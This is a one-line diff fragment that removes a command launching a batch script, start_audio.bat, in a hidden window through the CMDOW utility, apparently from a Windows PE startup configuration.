@@ -1,1 +1,0 @@
-CMDOW /RUN /hid x:\windows\system32\start_audio.bat
